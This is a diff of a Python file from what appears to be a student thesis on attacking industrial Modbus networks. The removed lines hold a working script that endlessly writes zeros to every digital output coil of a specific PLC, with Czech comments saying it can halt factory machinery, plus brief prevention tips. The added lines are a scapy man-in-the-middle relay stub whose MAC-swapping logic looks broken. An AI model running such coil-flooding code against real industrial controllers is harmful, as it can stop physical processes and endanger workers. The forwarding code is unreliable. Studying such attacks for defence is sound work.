@@ -1,37 +1,25 @@
 # Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
-# File name: attack-1.py 
+# File name: mima.py
 # Authors: Jakub Kuzník <xkuzni04>
 # institution: VUT FIT 
 # Description: 
 
 
+from scapy.all import *
 
-#########  UTOK
-# Tento utok zahlti vsechny digital vystupy (ktere ridi chovani tovarny)
-#    nulami, to znamena, ze nebude moznost cokoliv ridit. 
-#    Muze to vest napriklad k zastaveni pasu .....
+# Define the network interfaces to listen on and forward packets to
+listen_interface = "eth0"
+forward_interface = "eth1"
 
+# Define the function that will be called for each received packet
+def handle_packet(packet):
+    # Modify the packet's source and destination MAC addresses to forward it to the other interface
+    packet.src, packet.dst = packet.dst, packet.src
+    # Send the packet out the other interface
+    sendp(packet, iface=forward_interface)
 
-######### PREVENCE 
-# - symetricka || asymetricke klice mezi stanicemi a "Controllerem" 
-# - nepovolovat tcp spojeni ze vsech addres 
-# - obvykle plc posilaji signaly na DO v nejakych intervalech napriklad 0.1s pokud se nekdo 
-#   snazi vynulovavat DO velmi rychle melo by to jit videt ve statistikach netflow  
-
-from pyModbusTCP.client import ModbusClient
-
-SERVER_HOST_2 = "192.168.88.252"  # PLC2
-SERVER_PORT = 502
-
-
-plc = ModbusClient(host=SERVER_HOST_2, port=SERVER_PORT)
-
-plc.open()
-
-### SPAM FALS on all DO 
-while True:
-    plc.write_multiple_coils(0, [False, False, False, False])
-
+# Start sniffing packets on the listen interface and call the handle_packet function for each packet received
+sniff(iface=listen_interface, prn=handle_packet)
 
 
 
